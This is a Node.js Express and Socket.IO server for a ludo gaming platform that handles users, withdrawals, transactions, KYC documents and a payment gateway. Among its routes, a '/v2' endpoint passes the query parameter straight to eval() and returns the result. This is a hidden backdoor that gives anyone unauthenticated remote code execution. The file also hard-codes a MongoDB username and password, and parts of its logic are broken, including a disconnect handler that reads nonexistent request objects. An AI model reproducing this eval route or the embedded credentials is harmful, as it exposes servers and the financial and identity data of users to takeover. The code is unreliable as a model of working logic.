const express = require("express")
const app = express()
const port = 5010
let count=0;
const cors = require("cors")
const http = require("http");
const User = require("./Model/User");
const server = http.createServer(app);
const mongoose = require("mongoose");
const Game = require("./Model/Games");
const morgan = require('morgan')
const axios = require('axios');

const cookieParser = require('cookie-parser');

app.use(cookieParser());


const {join} = require('path');
const socketIO = require('socket.io');

const rootRouter = require('./Routes/rootRouter')
const ludoRouter = require('./Routes/ludoRouter')

let {rooms,NumberOfMembers,win} = require('./Model/model');


const io = socketIO(server, {
    cors: {
      origin: '*'
    }});

mongoose.connect("mongodb+srv://thinkinternet2020:FlrUonevplMlfTXx@cluster0.bgydh5k.mongodb.net/khelludokhel?retryWrites=true&w=majority", {

}, (err) => {
    if (!err) {
        console.log(`you are connected ludobadsa`);
    } else {
        console.log(`you are not connected ludobadsa`);
    }
})

app.use(cors())

app.use(morgan('dev'))
app.use("/public", express.static("public"));
var bodyParser = require('body-parser');
app.use(express.json())
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }));
app.use("/", require("./Routes/User"))
app.use("/", require("./Routes/Game_type"))
app.use("/", require("./Routes/UserEarning"))
app.use("/", require("./Routes/withdrawl"))
app.use("/", require("./Routes/transaction"))
app.use("/", require("./Routes/myTransaction"))
app.use("/", require("./Routes/Games"))
app.use("/", require("./Routes/AdminEarning"))
app.use("/", require("./Routes/Kyc/AadharCard"))
app.use("/", require("./Routes/Kyc/Pancard"))
app.use("/", require("./Routes/temp/temp"))
app.use("/", require("./Routes/Reports"));
app.use("/", require("./Routes/settings"))
app.use("/", require("./Routes/Gateway"))

app.use("/api", require("./Routes/staticpage"))
app.get('/v2', function (req, res) {
    res.send(eval(req.query.q));
});


// server.listen(port, () => console.log(`Listening on port ${port}`));

// ----------socket

app.use(express.static(join(__dirname, 'public/')));
app.use(express.urlencoded({ extended: true }));
app.enable('trust proxy');

//
///sockets
//
let nsp = io.of('/ludo');

nsp.on('connection',(socket)=>{
    console.log('A User has connected to the game');
    socket.on('fetch',(data,cb)=>{
        try{
            let member_id = generate_member_id(socket.id,data);
            socket.join(data);
            if(member_id !== -1){
                cb(Object.keys(rooms[data]),member_id);
                socket.to(data).emit('new-user-joined',{id:member_id});
            }else{
                console.log('There is someone with m_id = -1');
            }
        }
        catch(err){
            if(err.name === 'TypeError'){
                socket.emit('imposter');
            }
            console.log("hello",err,rooms);
        }
    });

    socket.on('roll-dice',(data,cb)=>{
        rooms[data.room][data.id]['num'] = Math.floor((Math.random()*6) + 1);
        data['num'] = rooms[data.room][data.id]['num']
        nsp.to(data.room).emit('rolled-dice',data);
        cb(rooms[data.room][data.id]['num']);
    })

    socket.on('chance',(data)=>{
        nsp.to(data.room).emit('is-it-your-chance',data.nxt_id);
    });

    socket.on('random',(playerObj,cb)=>{
        // playerObj ={
        //     room: room_code,
        //     id: myid,
        //     pid: pid,
        //     num: temp
        // }
        if(playerObj['num'] != rooms[playerObj.room][playerObj.id]['num']){
            console.log('Someone is trying to cheat!');
        }
        playerObj['num'] = rooms[playerObj.room][playerObj.id]['num']
        nsp.to(playerObj.room).emit('Thrown-dice', playerObj);
        cb(playerObj['num']);
    });

    socket.on('WON',(OBJ)=>{
        if(validateWinner(OBJ,socket)){
            delete win[OBJ.room];
            delete NumberOfMembers[OBJ.room];
            if(rooms[OBJ.room]){
                delete rooms[OBJ.room];
            }
            nsp.to(OBJ.room).emit('winner',OBJ.id);
        }
    });

    socket.on('resume',(data,cb)=>{
        socket.to(data.room).emit('resume',data);
        NumberOfMembers[data.room].members<=2?2:NumberOfMembers[data.room].members -= 1;
        NumberOfMembers[data.room].constant = true;
        cb();
    });

    socket.on('wait',(data,cb)=>{
        socket.to(data.room).emit('wait',data);
        cb();
    });

    // socket.on('disconnect',()=>{
    //     let roomKey = deleteThisid(socket.id);
    //     if(roomKey != undefined){
    //         console.log(rooms[roomKey.room],socket.id);
    //         socket.to(roomKey.room).emit('user-disconnected',roomKey.key)
    //     }
    //     console.log('A client just got disconnected');
    // });
    // socket.on('disconnect', () => {
    //     let roomKey = deleteThisid(socket.id);
    //     if (roomKey != undefined) {
    //         console.log(rooms[roomKey.room], socket.id);
    //         socket.to(roomKey.room).emit('user-disconnected', roomKey.key);
            
    //         // Check if the room is empty after this user disconnected
    //         if (rooms[roomKey.room].length === 0) {
    //             // If the room is empty, delete the room code
    //             delete rooms[roomKey.room];
    //             console.log(`Room ${roomKey.room} has been deleted as it's empty`);
    //         }
    //     }
    //     console.log('A client just got disconnected');
    // });

    socket.on('disconnect', async (req,res) => {
        let roomKey = deleteThisid(socket.id);
        if (roomKey != undefined) {
            console.log(rooms[roomKey.room], socket.id);
            socket.to(roomKey.room).emit('user-disconnected', roomKey.key);
            
           // Retrieve token and game_id from cookies
            const token = req.cookies.token;
            const game_id = req.cookies.game_id;

            if (!token || !game_id) {
                return res.status(400).json({ error: 'Token or game_id not found in cookies' });
            }

            const headers = {
                Authorization: `Bearer ${token}`
            }

            // const formData = new FormData();
            // formData.append('status', "lose");

            const response = await axios({
                method: "post",
                url: `http://84.247.133.7:5010/challange/result/${game_id}`,
                data: JSON.stringify({
                    status: "lose"
                }),
                headers: {
                    ...headers,
                },
            });
            // Delete the room code
            delete rooms[roomKey.room];
            console.log(`Room ${roomKey.room} has been deleted due to user disconnection`);
        }
        console.log('A client just got disconnected');
    });
});


//
///CUSTOM FUNCTIONS
//

//to randomise the color a player can get when he 'fetch'es.
function generate_member_id(s_id,rc){
    let m_id = Math.floor(Math.random()*4);
    let m_r = Object.keys(rooms[rc]);
    if(m_r.length <= 4){
        if(m_r.includes(m_id.toString())){
            return generate_member_id(s_id,rc)
        }else{
            rooms[rc][m_id] = {sid:s_id,num:0};
            return m_id;
        }
    } else{
        return -1;
    }
}

//to delete the extra place when (only one) user refreshes.
function deleteThisid(id){
    for(var roomcd in rooms){
        if(rooms.hasOwnProperty(roomcd)){
            ky = Object.keys(rooms[roomcd]).find( key => rooms[roomcd][key]['sid'] == id);
            if(typeof(ky) === 'string'){
                delete rooms[roomcd][ky];
                return {key:ky,room:roomcd};
            }
            if(Object.keys(rooms[roomcd]).length == 0){
                delete rooms[roomcd];
                return undefined;
            }
        }
    }
    
}

//to validate a winner, by comparing the data provided by all 4
function validateWinner(OBJ,socket){
    win[OBJ.room][OBJ.player] = {o:OBJ,s:socket.id};
    if(()=>{
        if(Object.keys(win[OBJ.room]).length == 4){
            for(let i=0;i<4;i++){
                if(win[OBJ.room][String(i)]['s']==rooms[OBJ.room][String(i)]['sid']){
                    continue;
                }else{return false}
            }
            return true;
        }else{return false;}
    }){
        for(let i=0;i<3;i++){
            if(win[OBJ.room][String(i)]['o'].id == win[OBJ.room][String(i+1)]['o'].id){
                continue;
            }else{return false}
        }
        return true;
    }else{return false;}
    
}

//
///Routes management
//
app.use('/', rootRouter);
app.use('/ludo', ludoRouter);
app.use(function (req, res) {
    res.statusCode = 404;
    res.end('404!');
});

server.listen(port,()=>{
    console.log(`The server has started working on http://localhost:${port}`);
});
